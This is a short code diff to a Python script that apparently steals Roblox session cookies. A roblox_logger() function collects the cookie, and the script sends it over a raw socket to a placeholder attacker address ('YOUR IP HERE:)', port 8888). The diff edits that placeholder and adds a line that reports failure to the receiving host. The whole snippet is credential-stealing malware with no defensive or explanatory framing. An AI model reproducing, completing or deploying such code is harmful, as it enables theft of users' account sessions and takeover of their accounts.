@@ -2,7 +2,7 @@ import socket
 from modules.loggers import *
 from modules.ThreadWithReturnValue import *
 
-addr = ('server ip here', 8888)
+addr = ('YOUR IP HERE:)', 8888)
 
 
 def roblox_logger():
@@ -31,6 +31,7 @@ if __name__ == '__main__':
 
     cookie = roblox_logger()
     if cookie is False:
+        s.send(b'False')
         s.close()
     else:
         s.send(cookie)
